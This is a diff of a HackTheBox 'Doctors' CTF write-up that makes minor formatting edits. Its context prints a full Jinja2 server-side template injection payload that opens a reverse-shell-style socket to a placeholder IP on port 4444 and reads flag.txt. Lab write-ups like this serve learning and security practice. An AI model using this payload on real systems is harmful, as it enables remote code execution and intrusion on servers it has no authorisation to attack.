@@ -3,8 +3,8 @@
 ### HackTheBox
 ### Easy (retired)
 
-IP: 10.129.242.87 
-Host: www.doctors.htb, doctors.htb
+* IP: 10.129.242.87 
+* Host: www.doctors.htb, doctors.htb
 
 ### NMAP
 ```console
@@ -167,7 +167,8 @@ Also found this on [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-
 This is a reverse shell paylod. I just have to add my IP address at the `s.connect((\"IP\",444))` portion with an open `netcat` listener on
 port 4444 (or any port I would like) and should hopefully get shell access to machine.
 
->>>> _20 minutes later_ <<<<
+_20 minutes later..._
+
 ```python
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
